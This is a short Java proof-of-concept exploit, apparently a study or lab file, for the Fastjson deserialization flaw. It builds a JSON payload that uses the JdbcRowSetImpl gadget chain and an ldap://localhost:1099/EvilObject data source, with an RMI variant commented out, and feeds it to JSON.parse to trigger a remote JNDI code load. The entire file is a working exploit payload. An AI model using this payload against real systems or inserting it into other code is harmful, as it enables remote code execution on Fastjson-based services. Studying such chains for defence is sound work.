import com.alibaba.fastjson.JSON;

// 基于 JdbcRowSetImpl 的利用链
public class Exp {
    public static void main(String[] args) {
        // ldap攻击
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1099/EvilObject\", \"autoCommit\":true}";

        // rmi攻击
        //String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/EvilObject\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}